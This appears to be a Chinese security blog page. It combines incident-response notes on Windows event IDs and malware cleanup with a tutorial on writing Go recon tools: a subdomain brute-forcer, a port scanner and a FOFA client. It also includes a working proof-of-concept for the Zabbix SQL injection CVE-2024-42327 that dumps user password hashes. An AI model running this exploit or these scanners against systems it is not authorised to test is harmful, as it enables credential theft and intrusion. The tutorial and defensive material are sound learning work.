登录&#x2F;注销事件（Logon&#x2F;Logoff） 事件ID 说明 4624 用户登录成功（记录登录类型，如本地、远程、RDP等）。 4625 用户登录失败（可用于检测暴力破解）。 4634 用户注销。 4647 用户主动注销（如 logoff 命令）。 4648 使用显式凭据登录（如 runas）。 4672 使用特权账户登录（如 Administrator）。 登录类型（Logon Type）参考： 2 - 本地交互登录（键盘输入） 3 - 网络登录（如共享文件夹访问） 4 - 批处理任务（计划任务） 5 - 服务登录 7 - 解锁屏幕 10 - 远程交互登录（RDP） 3. 账户管理事件（Account Management） 事件ID 说明 4720 用户账户创建。 4722 用户账户启用。 4723 用户账户密码更改尝试。 4724 用户账户密码重置。 4725 用户账户禁用。 4726 用户账户删除。 4738 用户账户属性更改（如用户名）。 4740 锁定账户（如多次密码错误）。 用户组变更事件 事件ID 说明 4727 安全组创建。 4737 安全组修改。 4739 域策略更改（如域密码策略调整）。 4762 用户添加到组。 4. 其他关键安全事件 事件ID 说明 1102 安全日志被手动清除（需警惕攻击痕迹清除）。 4688 新进程创建（记录命令行，可用于检测恶意进程）。 4698 计划任务创建。 4702 计划任务更新。 5140 网络共享访问（记录访问文件&#x2F;文件夹）。 5156 Windows 防火墙规则修改。 5. 可疑&#x2F;攻击相关事件 事件ID 说明 4611 系统时间被修改（攻击者可能掩盖行踪）。 4673 特权服务调用（可能提权攻击）。 4697 服务安装（可能后门植入）。 4768 Kerberos 认证票证请求（可用于检测黄金票据攻击）。 4769 Kerberos 服务票证请求（可用于检测白银票据攻击）。 如何查询事件日志？ 使用事件查看器： 按 Win + R，输入 eventvwr.msc。 筛选特定事件 ID（如 4625 查看登录失败）。 使用 PowerShell： powershell 复制 1Get-WinEvent -FilterHashtable @&#123;LogName=&#x27;Security&#x27;; ID=4624, 4625&#125; -MaxEvents 100 日志分析工具： Sysmon（增强日志记录） ELK Stack（大规模日志分析） **Windows Event Forwarding (WEF)**（集中收集日志） 总结 登录审计：重点关注 4624（成功）、4625（失败）。 账户变更：监控 4720（创建）、4726（删除）。 日志篡改：警惕 104、1102（日志清除）。 可疑行为：检查 4688（新进程）、4698（计划任务）。 建议定期备份日志，并结合 SIEM（如 Splunk、Azure Sentinel）进行自动化分析。 补充问题应急响应，应急处置 webshell&#x2F;⽊⻢病毒&#x2F;勒索病毒等该如何进⾏处置？ 收集主机信息（系统日志（Windows事件ID 4688&#x2F;5140；Linux /var/log/auth.log），搭建了什么服务（apache，nginx，iss），排查用户（有隐藏用户或者影子用户就删除），排查网络连接（看看大端口有没有c2连接，找到对应pid），排查进程（删除c2出网pid），排查计划任务，以及启动项）&#x3D;&gt; 抑制，隔离感染主机（临时关闭Web服务） &#x3D;&gt; 删除恶意文件，更新web应用，升级或者打补丁 &#x3D;&gt; 产出报告 木马的话也是看进程，有没有外连ip，隐藏进程什么的，然后隔离主机 挖矿，1）执行top命令，查看CPU占用情况，有无异常 2）查找恶意文件样本，并确定程序的运行时间 3） 首先获取恶意域名（微步在线、360威胁情报中心…获取），从而根据域名确定木马类型 4）处理异常进程并删除恶意文件，最后排查是否有可疑的计划任务、自启动 勒索病毒 1）首先就是物理断网、隔离主机，然后判断勒索病毒存活，可以通过创建几个.exe .txt空白文件看是否会被加密判断存活 2）排查业务系统，了解勒索病毒加密时间、中招范围以及影响程度 3）可以根据预留文件、预留邮箱判断出攻击团伙，对后续的溯源也有很大的帮助 4）分析勒索程序，获取ip、域名相关信息，上传至威胁情报中心查询 5）可以将勒索程序上传到一些勒索病毒搜索引擎，比如360、深信服，看能不能进行解密。 查杀病毒&#x2F;扫描webshell&#x2F;等等⽤到什么⼯具？ 火绒，360.河马，D盾 如何检查异常的⽹络&#x2F;端⼝&#x2F;进程？ 12345678Windows：netstat -ano | findstr ESTABLISHED # 查看活动连接netstat -ano | findstr LISTENING # 查看监听端口netstat -ano | findstr &quot;1.1.1.1&quot; # 替换为可疑外连任务管理器看进程Linux：lsof -i -P -n | grep ESTABLISHED # 查看已建立的连接ps aux | grep -v &quot;\\[&quot; # 排除内核线程 后⻔分析 windows&#x2F;linux后⻔都有哪些？ 注册表后门，计划任务后门，DLL劫持 定时任务，SSH后门 windows服务器中C2分析排查思路？ ​\t火绒剑看进程，先看未知文件，再看对外连接，把怀疑程序上传到开源情报平台 怎么查看计划任务&#x2F;启动项&#x2F;后⻔账号&#x2F;新增账号&#x2F;注册表&#x2F;服务？ ​\t控制面板任务计划程序&#x2F;注册表启动项&#x2F;（net user，注册表，控制面板用户组）&#x2F;regedit.exe&#x2F;C:\\Windows\\System32 ​\t&#x2F;etc&#x2F;cron* &#x2F; ~&#x2F;.bashrc ~&#x2F;.profile &#x2F; &#x2F;etc&#x2F;passwd,&#x2F;var&#x2F;log&#x2F;auth.log(),&#x2F;var&#x2F;log&#x2F;secure windows&#x2F;linux有哪些可疑⽬录&#x2F;⾼⻛险⽬录？ 临时目录 系统目录 WEB服务相关目录 ⼊侵排查 web服务器被⼊侵，如何分析⼊侵途径？ 内⽹不出⽹办公主机被⼊侵，如何分析⼊侵途径 入口类型 Windows排查点 Linux排查点 弱口令爆破 事件ID 4625（登录失败） /var/log/auth.log 漏洞利用 应用日志（如Web服务、数据库） journalctl -u apache2 恶意文件 下载目录、邮件附件 ~/.cache/、/tmp/ USB摆渡 Setupapi.log（设备接入记录） dmesg、/var/log/syslog 横向渗透 事件ID 4648（显式凭证使用） last、/var/log/secure 如果主机失陷了，已经在横向了，应该如何去做应急，如何进一步排查失陷的范围 隔离主机（立即封锁失陷主机的所有网络通信（防火墙策略或交换机端口禁用），若AD域控受影响，紧急冻结所有域账户密码） 终止恶意进程，禁用可疑账户 主机级横向证据，检查近期登录记录：Get-WinEvent -FilterHashtable @&#123;LogName=&#39;Security&#39;; ID=4624&#125;，检查SSH爆破：grep &quot;Failed password&quot; /var/log/auth.log 失陷范围确认 nmap 扫描网段。 ⽇志分析 windows安全⽇志怎么看？ 按下 Win + R，输入 eventvwr.msc 打开事件查看器，Windows 日志→安全 以下是需重点关注的安全事件ID及其含义： 事件ID 说明 攻击场景关联 4624 账号登录成功 正常登录或攻击者成功爆破 4625 账号登录失败 密码爆破、横向移动尝试 4648 使用显式凭证登录（如runas） 横向渗透、Pass-the-Hash攻击 4672 特权账号登录（如Administrator） 高权限账号滥用 4688 新进程创建 恶意进程启动（需结合父进程分析） 4698 计划任务创建 后门持久化 4700 服务安装 攻击者安装恶意服务 4720 用户账号创建 攻击者添加隐藏账号 4740 用户账号锁定 账号爆破防护触发 4776 NTLM认证请求 NTLM Relay攻击痕迹 5140 网络共享访问 横向移动（如SMB爆破） windows⽇志4624&#x2F;4625的含义？ 登录⽇志怎么看？ windows 事件ID 说明 攻击场景关联 4624 账号登录成功 正常登录或攻击者成功爆破 4625 账号登录失败 密码爆破、横向移动尝试 4648 使用显式凭证登录（如runas） 横向渗透、Pass-the-Hash攻击 4672 特权账号（如Administrator）登录 高权限账号滥用 Linux /var/log/auth.log（Debian&#x2F;Ubuntu） /var/log/secure（CentOS&#x2F;RHEL） /var/log/lastlog（所有用户的最近登录记录）","tags":["网安"],"categories":["打工人的三两事"]},{"title":"go 红蓝武器库功能开发","path":"/2025/02/13/go/开发/功能开发/","content":"子域名爆破 os.Open(filename) 打开文件，并使用 bufio.NewScanner(file) 逐行读取子域名。 读取到的子域名前缀存入 subdomains 切片中，后续拼接完整域名进行查询。 123456789101112131415func loadSubdomains(filename string) ([]string, error) &#123;\tfile, err := os.Open(filename)\tif err != nil &#123; return nil, err\t&#125;\tdefer file.Close()\tvar subdomains []string\tscanner := bufio.NewScanner(file)\tfor scanner.Scan() &#123; subdomains = append(subdomains, scanner.Text())\t&#125;\treturn subdomains, scanner.Err()&#125; 先简单实现一个单线程爆破版本，以 baidu.com 为例 123for _, subdomain := range subdomains &#123;\tdomain := subdomain + &quot;.baidu.com&quot;&#125; 用 net 包的LookupHost函数实现 DNS 解析 123456789func resolveSubdomain(subdomain string) &#123;\taddrs, err := net.LookupHost(subdomain)\tif err != nil &#123; return\t&#125;\tfor _, addr := range addrs &#123; fmt.Printf(&quot;[+] %s -&gt; %s &quot;, subdomain, addr)\t&#125;&#125; 大概功能实现后我们可以继续优化 多线程 ​\t•\t采用 goroutines 并行查询，提高爆破效率。 ​\t•\t使用 sync.WaitGroup 确保所有任务执行完成后退出。 ​\t•\t使用 channel 传递查询结果，防止数据竞争。 123456789var wg sync.WaitGroup\tmaxthreads := 20\tsem := make(chan struct&#123;&#125;, maxthreads)\tfor _, subdomain := range subdomains &#123; domain := subdomain + &quot;.baidu.com&quot; wg.Add(1) go resolveSubdomain(domain, &amp;wg, sem)\t&#125; 超时控制 DNS 查询可能卡住，可以用 context.WithTimeout() 限制时间： 1234567891011func resolveSubdomain(subdomain string) &#123;\tctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)\tdefer cancel()\taddrs, err := net.DefaultResolver.LookupHost(ctx, subdomain)\tif err != nil &#123; return\t&#125;\tfor _, addr := range addrs &#123; fmt.Printf(&quot;[+] %s -&gt; %s &quot;, subdomain, addr)\t&#125;&#125; 指定 DNS 服务器 可指定 Google 公共 DNS 解析，提高准确率： 123456789ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)defer cancel()resolver := net.Resolver&#123;\tPreferGo: true,\tDial: func(ctx context.Context, network, address string) (net.Conn, error) &#123; d := net.Dialer&#123;Timeout: 3 * time.Second&#125; return d.DialContext(ctx, network, &quot;8.8.8.8:53&quot;)\t&#125;,&#125; 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport (\t&quot;bufio&quot;\t&quot;fmt&quot;\t&quot;golang.org/x/net/context&quot;\t&quot;net&quot;\t&quot;os&quot;\t&quot;sync&quot;\t&quot;time&quot;)func loadSubdomains(filename string) ([]string, error) &#123;\tfile, err := os.Open(filename)\tif err != nil &#123; return nil, err\t&#125;\tdefer file.Close()\tvar subdomains []string\tscanner := bufio.NewScanner(file)\tfor scanner.Scan() &#123; subdomains = append(subdomains, scanner.Text())\t&#125;\treturn subdomains, scanner.Err()&#125;func resolveSubdomain(subdomain string, wg *sync.WaitGroup, sem chan struct&#123;&#125;) &#123;\tdefer wg.Done()\tsem &lt;- struct&#123;&#125;&#123;&#125;\tdefer func() &#123; &lt;-sem &#125;()\tctx, cancel := context.WithTimeout(context.Background(), 1*time.Second)\tdefer cancel()\tresolver := net.Resolver&#123; PreferGo: true, Dial: func(ctx context.Context, network, address string) (net.Conn, error) &#123; d := net.Dialer&#123;Timeout: 3 * time.Second&#125; return d.DialContext(ctx, network, &quot;8.8.8.8:53&quot;) &#125;,\t&#125;\taddrs, err := resolver.LookupHost(ctx, subdomain)\tif err != nil &#123; return\t&#125;\tfor _, addr := range addrs &#123; fmt.Printf(&quot;[+] %s -&gt; %s &quot;, subdomain, addr)\t&#125;&#125;func main() &#123;\tsubdomains, err := loadSubdomains(&quot;subdomains.txt&quot;)\tif err != nil &#123; panic(err)\t&#125;\tvar wg sync.WaitGroup\tmaxthreads := 20\tsem := make(chan struct&#123;&#125;, maxthreads)\tfor _, subdomain := range subdomains &#123; domain := subdomain + &quot;.baidu.com&quot; wg.Add(1) go resolveSubdomain(domain, &amp;wg, sem)\t&#125;\twg.Wait()\t// 计算时间\tstart := time.Now()\tfmt.Println(&quot;Time:&quot;, time.Since(start))&#125; 导出文件输出结果回显在前端直观，但是不好操作数据，所以我们可以添加一个导出功能，我更偏向于导出 csv 文件，设计两个字段，一个域名，一个对应的 ip，这里只保留 ipv4，使用的是 gocsv 库 1go get -u github.com/gocarina/gocsv 123456789101112131415161718192021222324252627282930type ExportedSubdomain struct &#123;\tName string `csv:&quot;域名&quot;`\tIP string `csv:&quot;IP&quot;`\tTime string `csv:&quot;时间&quot;`&#125;func ExportResults(s *Subdomain) error &#123;\tfilename := s.Domain + &quot;.csv&quot;\tfile, err := os.OpenFile(&quot;./output/subdomain/&quot;+filename, os.O_CREATE|os.O_WRONLY, 0644)\tif err != nil &#123; panic(err)\t&#125;\tdefer file.Close()\tsubdomains := []*ExportedSubdomain&#123;&#125;\t// 遍历 s.Results，将结果转换为 ExportedSubdomain 结构体\tfor _, result := range s.Results &#123; result = strings.TrimPrefix(result, &quot;[+] &quot;) parts := strings.Split(result, &quot; -&gt; &quot;) subdomains = append(subdomains, &amp;ExportedSubdomain&#123; Name: parts[0], IP: parts[1], Time: time.Now().Format(&quot;2006-01-02 15:04:05&quot;), &#125;)\t&#125;\terr = gocsv.MarshalFile(&amp;subdomains, file) // Use this to save the CSV back to the file\tif err != nil &#123; panic(err)\t&#125;\treturn nil&#125; 进度条实时更新这就要用到 Events 事件 来侦听了。 后端 1runtime.EventsEmit(s.ctx, &quot;subdomain-progress&quot;, percentage) 前端 12345678910111213141516171819// 在组件挂载时开始监听事件onMounted(() =&gt; &#123; EventsOn(&#x27;subdomain-progress&#x27;, (percentage) =&gt; &#123; console.log(9999) console.log(percentage) progress.value = percentage &#125;) EventsOn(&#x27;subdomain-done&#x27;, (time) =&gt; &#123; console.log(&#x27;Scanning done in&#x27;, time) loading.value = false &#125;)&#125;)// 在组件卸载时停止监听事件onUnmounted(() =&gt; &#123; EventsOff(&#x27;subdomain-progress&#x27;) EventsOff(&#x27;subdomain-done&#x27;)&#125;) 调用 fofa api获取用户信息查一下 fofa 官方文档 https://fofa.info/api/info 1234type Fofa_Client struct &#123; email string key string&#125; 再写一个实现方法 123456func New_Fofa_Client(email string, key string) *Fofa_Client &#123;\treturn &amp;Fofa_Client&#123; email: email, key: key,\t&#125;&#125; 官网给的响应实例 123456789101112131415161718&#123; &quot;error&quot;: false, // 是否出现错误 &quot;email&quot;: &quot;fo****t@baimaohui.net&quot;, // 邮箱地址： &quot;username&quot;: &quot;fofabot&quot;, // 用户名 &quot;category&quot;: &quot;user&quot;, // 用户种类 &quot;fcoin&quot;: 0, // F币 &quot;fofa_point&quot;: 49200, // F点 &quot;remain_free_point&quot;: 0, // 剩余免费F点 &quot;remain_api_query&quot;: 49992, // API月度剩余查询次数 &quot;remain_api_data&quot;: 499398, // API月度剩余返回数量 &quot;isvip&quot;: true, // 是否是会员 &quot;vip_level&quot;: 12, // page.api.whether.level &quot;is_verified&quot;: false, &quot;avatar&quot;: &quot;https://nosec.org/missing.jpg&quot;, &quot;message&quot;: &quot;&quot;, &quot;fofacli_ver&quot;: &quot;4.0.3&quot;, &quot;fofa_server&quot;: true&#125; 定义接收类型 123456789101112131415161718type Fofa_API_Info struct &#123;\tError bool `json:&quot;error&quot;`\tEmail string `json:&quot;email&quot;`\tUsername string `json:&quot;username&quot;`\tCategory string `json:&quot;category&quot;`\tFcoin int `json:&quot;fcoin&quot;`\tFofaPoint int `json:&quot;fofa_point&quot;`\tRemainFreePoint int `json:&quot;remain_free_point&quot;`\tRemainApiQuery int `json:&quot;remain_api_query&quot;`\tRemainApiData int `json:&quot;remain_api_data&quot;`\tIsvip bool `json:&quot;isvip&quot;`\tVipLevel int `json:&quot;vip_level&quot;`\tIsVerified bool `json:&quot;is_verified&quot;`\tAvatar string `json:&quot;avatar&quot;`\tMessage string `json:&quot;message&quot;`\tFofacliVer string `json:&quot;fofacli_ver&quot;`\tFofaServer bool `json:&quot;fofa_server&quot;`&#125; 实现方法 123456789101112131415161718192021func (fofa_client *Fofa_Client) API_Info() (*Fofa_API_Info, error) &#123;\tBaseURL := &quot;https://fofa.info/api/v1/&quot;\turl := BaseURL + &quot;info/my&quot;\tclient := req.C()\tres, err := client.R().SetQueryParams(map[string]string&#123; &quot;email&quot;: fofa_client.email, &quot;key&quot;: fofa_client.key,\t&#125;).Get(url)\tif err != nil &#123; return nil, err\t&#125;\tvar ret Fofa_API_Info\terr = json.Unmarshal(res.Bytes(), &amp;ret)\tif err != nil &#123; return nil, err\t&#125;\treturn &amp;ret, nil&#125; 完整代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;github.com/imroc/req/v3&quot;)type Fofa_Client struct &#123;\temail string\tkey string&#125;type Fofa_API_Info struct &#123;\tError bool `json:&quot;error&quot;`\tEmail string `json:&quot;email&quot;`\tUsername string `json:&quot;username&quot;`\tCategory string `json:&quot;category&quot;`\tFcoin int `json:&quot;fcoin&quot;`\tFofaPoint int `json:&quot;fofa_point&quot;`\tRemainFreePoint int `json:&quot;remain_free_point&quot;`\tRemainApiQuery int `json:&quot;remain_api_query&quot;`\tRemainApiData int `json:&quot;remain_api_data&quot;`\tIsvip bool `json:&quot;isvip&quot;`\tVipLevel int `json:&quot;vip_level&quot;`\tIsVerified bool `json:&quot;is_verified&quot;`\tAvatar string `json:&quot;avatar&quot;`\tMessage string `json:&quot;message&quot;`\tFofacliVer string `json:&quot;fofacli_ver&quot;`\tFofaServer bool `json:&quot;fofa_server&quot;`&#125;func New_Fofa_Client(email string, key string) *Fofa_Client &#123;\treturn &amp;Fofa_Client&#123; email: email, key: key,\t&#125;&#125;func (fofa_client *Fofa_Client) API_Info() (*Fofa_API_Info, error) &#123;\tBaseURL := &quot;https://fofa.info/api/v1/&quot;\turl := BaseURL + &quot;info/my&quot;\tclient := req.C()\tres, err := client.R().SetQueryParams(map[string]string&#123; &quot;email&quot;: fofa_client.email, &quot;key&quot;: fofa_client.key,\t&#125;).Get(url)\tif err != nil &#123; return nil, err\t&#125;\tvar ret Fofa_API_Info\terr = json.Unmarshal(res.Bytes(), &amp;ret)\tif err != nil &#123; return nil, err\t&#125;\treturn &amp;ret, nil&#125;func main() &#123;\tclient := New_Fofa_Client(&quot;xxxx@qq.com&quot;, &quot;xxxxxx&quot;)\tinfo, err := client.API_Info()\tif err != nil &#123; panic(err)\t&#125; else &#123; fmt.Println( &quot;Email:&quot;, info.Email, &quot;Username:&quot;, info.Username, )\t&#125;&#125; 获取主机信息123456789101112131415161718192021222324252627282930313233343536373839404142type Fofa_Info_Search_Host struct &#123;\tError bool `json:&quot;error&quot;`\tSize int `json:&quot;size&quot;`\tPage int `json:&quot;page&quot;`\tMode string `json:&quot;mode&quot;`\tQuery string `json:&quot;query&quot;`\tResults [][]string `json:&quot;results&quot;`&#125;func New_Fofa_Info_Search(q string) *Fofa_Info_Search &#123;\treturn &amp;Fofa_Info_Search&#123; Qbase64: q, Fields: &quot;no&quot;, Page: 1, Size: 5, Full: false,\t&#125;&#125;func (fofa_client *Fofa_Client) Info_Search(q string) (*Fofa_Info_Search_Host, error) &#123;\tBaseURL := &quot;https://fofa.info/api/v1/&quot;\turl := BaseURL + &quot;search/all&quot;\tclient := req.C()\tres, err := client.R().SetQueryParams(map[string]string&#123; &quot;email&quot;: fofa_client.email, &quot;key&quot;: fofa_client.key, &quot;qbase64&quot;: q,\t&#125;).Get(url)\tif err != nil &#123; return nil, err\t&#125;\tvar ret Fofa_Info_Search_Host\terr = json.Unmarshal(res.Bytes(), &amp;ret)\tif err != nil &#123; return nil, err\t&#125;\treturn &amp;ret, nil&#125; 端口探测原理还是基于 TCP 的三次握手 简单理解TCP三次握手四次挥手（看一遍你就懂） TCP握手有三个过程。首先，客户端发送一个SYN探测包，如果客户端收到连接超时，说明该端口可能在防火墙后面。如果服务端应答syn-ack 包，意味着这个端口是打开的，否则会返回rst包，最后，客户端需要另外发送一个ack包。从这时起，客户端与服务端就已经建立连接。 TCP端口探测的实现，比较简单，原生的net包就有自带的方法，代码如下 1234567891011121314151617181920212223package mainimport (\t&quot;fmt&quot;\t&quot;net&quot;\t&quot;time&quot;)func PortScan(ip, port string) &#123;\t// TODO\taddr := fmt.Sprintf(&quot;%s:%s&quot;, ip, port)\tconn, err := net.DialTimeout(&quot;tcp&quot;, addr, time.Second*3)\tif err != nil &#123; fmt.Println(&quot;端口未开放&quot;) return\t&#125;\tfmt.Println(&quot;端口开放&quot;)\tdefer conn.Close()&#125;func main() &#123;\tPortScan(&quot;47.96.183.72&quot;, &quot;80&quot;)&#125; 这里使用了net包的DialTimeout方法，该方法第一个参数接收协议名称，这里用的是tcp，第二个参数是ip和端口，需要按照ip:port的格式拼接，第三个参数是超时时间，这里设置了3秒，表示如果超过三秒对端没有回应则不会继续等待。 接下来就是多线程优化了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package mainimport (\t&quot;fmt&quot;\t&quot;net&quot;\t&quot;strconv&quot;\t&quot;sync&quot;\t&quot;time&quot;)func PortScan(ip string, port int, wg *sync.WaitGroup, sem chan struct&#123;&#125;) &#123;\tdefer wg.Done()\tsem &lt;- struct&#123;&#125;&#123;&#125; // sem 容量未满（maxthreads 个槽位），允许新的 goroutine 运行\tdefer func() &#123; &lt;-sem &#125;() // 释放占用的槽位，允许新的 goroutine 进入。defer 保证 PortScan无论执行成功还是失败， goroutine 运行结束后释放槽位\taddr := fmt.Sprintf(&quot;%s:%s&quot;, ip, strconv.Itoa(port))\tconn, err := net.DialTimeout(&quot;tcp&quot;, addr, time.Second*1)\tif err != nil &#123; fmt.Println(&quot;端口&quot; + strconv.Itoa(port) + &quot;关闭&quot;) return\t&#125;\tfmt.Println(&quot;端口&quot; + strconv.Itoa(port) + &quot;开放&quot;)\tdefer conn.Close()\tOpenPorts = append(OpenPorts, port)&#125;var OpenPorts []intfunc main() &#123;\tvar wg sync.WaitGroup\ttopPorts := [...]int&#123;21, 22, 23, 25, 80, 443, 8080, 110, 135, 139, 445, 389, 489, 587, 1433, 1434, 1521, 1522, 1723, 2121, 3306, 3389, 4899, 5631, 5632, 5800, 5900, 7071, 43958, 65500, 4444, 8888, 6789, 4848, 5985, 5986, 8081, 8089, 8443, 10000, 6379, 7001, 7002&#125;\tmaxthreads := 20 // 20个线程\tsem := make(chan struct&#123;&#125;, maxthreads)\tstart := time.Now()\tfor _, port := range topPorts &#123; wg.Add(1) go PortScan(&quot;47.96.183.72&quot;, port, &amp;wg, sem)\t&#125;\twg.Wait()\tfmt.Println(&quot;开放端口：&quot;, OpenPorts)\tend := time.Since(start)\tfmt.Println(&quot;花费的总时间：&quot;, end)&#125; POC 检测这里打算用 cve-2024-42327，Zabbix SQL注入漏洞来演示。 网站搭建：https://mp.weixin.qq.com/s/ateGftMa4aCheSNYHarH1Q 默认账号密码为： 1Admin/zabbix 抓一个登录包 1234567891011121314POST /api_jsonrpc.php HTTP/1.1Host: 47.96.183.72:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3) AppleWebKit/616.24 (KHTML, like Gecko) Version/17.2 Safari/616.24Connection: keep-aliveContent-Type: application/json-rpcAccept-Encoding: gzip, deflate, brContent-Length: 119&#123; &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.login&quot;, &quot;params&quot;: &#123; &quot;username&quot;: &quot;Admin&quot;, &quot;password&quot;: &quot;zabbix&quot; &#125;, &quot;id&quot;: 1&#125; 拿到result的值后，使用第二个数据包，将auth的值改为result的值 12345678910111213141516POST /api_jsonrpc.php HTTP/1.1Host: 47.96.183.72:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.25Connection: keep-aliveContent-Type: application/json-rpcAccept-Encoding: gzip, deflate, brContent-Length: 182&#123; &quot;jsonrpc&quot;: &quot;2.0&quot;, &quot;method&quot;: &quot;user.get&quot;, &quot;params&quot;: &#123; &quot;selectRole&quot;: [&quot;roleid, u.passwd&quot;, &quot;roleid&quot;], &quot;userids&quot;: &quot;1&quot; &#125;, &quot;auth&quot;: &quot;7287bcdd769236ffbaddb8df16ff47e3&quot;, &quot;id&quot;: 2&#125; 可以通过更改userids的值，来遍历其他用户,selectRole参数可控，直接在后面加上sql语句，即可执行 知道漏洞原理就能来编写 go 脚本了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118package mainimport (\t&quot;fmt&quot;\t&quot;github.com/imroc/req/v3&quot;\t&quot;github.com/tidwall/gjson&quot;\t&quot;strconv&quot;)type CVE_2024_42327_Para1 struct &#123;\tJsonrpc string `json:&quot;jsonrpc&quot;`\tMethod string `json:&quot;method&quot;`\tParams struct &#123; Username string `json:&quot;username&quot;` Password string `json:&quot;password&quot;`\t&#125; `json:&quot;params&quot;`\tId int `json:&quot;id&quot;`&#125;type CVE_2024_42327_Para2 struct &#123;\tJsonrpc string `json:&quot;jsonrpc&quot;`\tMethod string `json:&quot;method&quot;`\tParams struct &#123; SelectRole []string `json:&quot;selectRole&quot;` Userids string `json:&quot;userids&quot;`\t&#125; `json:&quot;params&quot;`\tAuth string `json:&quot;auth&quot;`\tId int `json:&quot;id&quot;`&#125;type Poc struct &#123;\tName string\tUrl string&#125;var client = req.C()func (Poc *Poc) CVE_2024_42327() &#123;\t// 账号密码登录\turl := &quot;http://&quot; + Poc.Url + &quot;/api_jsonrpc.php&quot;\tPara1 := CVE_2024_42327_Para1&#123; Jsonrpc: &quot;2.0&quot;, Method: &quot;user.login&quot;, Params: struct &#123; Username string `json:&quot;username&quot;` Password string `json:&quot;password&quot;` &#125;&#123; Username: &quot;admin&quot;, Password: &quot;zabbix&quot;, &#125;, Id: 1,\t&#125;\t// 创建客户端\tclient.SetCommonHeaders(map[string]string&#123; &quot;Content-Type&quot;: &quot;application/json-rpc&quot;,\t&#125;)\t// 发送第一次请求\tresp, err := client.R().SetBodyJsonMarshal(&amp;Para1).Post(url)\tif err != nil &#123; fmt.Println(&quot;登录失败&quot;, err) return\t&#125;\tget := gjson.Get(resp.String(), &quot;result&quot;).String()\tif get == &quot;&quot; &#123; fmt.Println(&quot;登录失败&quot;, err) return\t&#125;\t// 遍历用户id\tfor i := 0; i &lt; 10; i++ &#123; Para2 := CVE_2024_42327_Para2&#123; Jsonrpc: &quot;2.0&quot;, Method: &quot;user.get&quot;, Params: struct &#123; SelectRole []string `json:&quot;selectRole&quot;` Userids string `json:&quot;userids&quot;` &#125;&#123; SelectRole: []string&#123;&quot;roleid, u.passwd,user()&quot;, &quot;roleid&quot;&#125;, Userids: strconv.Itoa(i), &#125;, Auth: get, Id: 2, &#125; // 发送第二次请求 resp, err := client.R().SetBodyJsonMarshal(&amp;Para2).Post(url) if err != nil &#123; fmt.Println(&quot;请求失败&quot;, err) return &#125; result := gjson.Get(resp.String(), &quot;result&quot;) if result.Exists() &amp;&amp; result.IsArray() &#123; //IsArray是判断是否是数组 // 遍历结果数组 for _, user := range result.Array() &#123; username := user.Get(&quot;username&quot;).String() name := user.Get(&quot;name&quot;).String() surname := user.Get(&quot;surname&quot;).String() userID := user.Get(&quot;userid&quot;).String() rolePasswd := user.Get(&quot;role.passwd&quot;).String() sqlInjectionUser := user.Get(&quot;role.user()&quot;).String() // 打印每个⽤户信息以及数据库 user fmt.Printf(&quot;%s, %s, %s, %s, %s,%s &quot;, username, name, surname, userID, rolePasswd, sqlInjectionUser) &#125; &#125; else &#123; fmt.Printf(&quot;No result found for user ID %d &quot;, i) &#125;\t&#125;&#125;func main() &#123;\tPoc := Poc&#123; Name: &quot;CVE-2024-42327&quot;, Url: &quot;47.96.183.72:8080&quot;,\t&#125;\tPoc.CVE_2024_42327()&#125; CDN 解析这里我们没有那么多服务器，所以还是调一下第三方接口 https://uutool.cn/cdn-check/, 抓包获取他们的服务器。 12345678910111213141516&quot;https://ips-app-vrdhcyxprn.us-west-1.fcapp.run&quot;: &quot;美国-硅⾕&quot;,&quot;https://ips-app-vrdhcyxprn.ap-southeast-5.fcapp.run&quot;: &quot;新加坡&quot;,&quot;https://ips-app-vrdhcyxprn.eu-west-1.fcapp.run&quot;: &quot;欧洲-伦敦&quot;,&quot;https://ips-app-vrdhcyxprn.eu-central-1.fcapp.run&quot;: &quot;欧洲-法兰克福&quot;,&quot;https://ips-app-vrdhcyxprn.ap-southeast-7.fcapp.run&quot;: &quot;印度尼⻄亚-雅加达&quot;,&quot;https://ips-app-vrdhcyxprn.ap-southeast-1.fcapp.run&quot;: &quot;印度尼⻄亚-雅加达&quot;,&quot;https://ips-app-vrdhcyxprn.ap-southeast-3.fcapp.run&quot;: &quot;印度尼⻄亚-雅加达&quot;,&quot;https://ips-app-nnrrqmtriz.cn-shenzhen.fcapp.run&quot;: &quot;中国-深圳&quot;,&quot;https://ips-app-vrdhcyxprn.cn-chengdu.fcapp.run&quot;: &quot;中国-成都&quot;,&quot;https://ips-app-nnrrjaztiz.cn-hangzhou.fcapp.run&quot;: &quot;中国-杭州&quot;,&quot;https://ips-app-vrdhcyxprn.cn-zhangjiakou.fcapp.run&quot;: &quot;中国-张家⼝&quot;,&quot;https://ips-app-vrdhcyxprn.ap-northeast-2.fcapp.run&quot;: &quot;韩国-⾸尔&quot;,&quot;https://ips-app-nnrrjaztiz.cn-beijing.fcapp.run&quot;: &quot;中国-北京&quot;,&quot;https://ips-app-vrdhcyxprn.cn-huhehaote.fcapp.run&quot;: &quot;中国-呼和浩特&quot;,&quot;https://ips-app-nnrrjaztiz.cn-hongkong.fcapp.run&quot;: &quot;中国-⾹港&quot;,&quot;https://ips-app-nnrrjaztiz.cn-qingdao.fcapp.run&quot;: &quot;中国-⻘岛&quot;, 该网站 响应IP数量：2 ，说明最多返回两个 ip，这一点接收返回值的时候要考虑进去，因为有这么多服务器，所以我们用多线程。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103package mainimport (\t&quot;fmt&quot;\t&quot;github.com/imroc/req/v3&quot;\t&quot;strings&quot;\t&quot;sync&quot;\t&quot;time&quot;)type CDNResult struct &#123;\tRegion string\tStatus string\tIPCount int\tIPList []string&#125;func main() &#123;\tip := 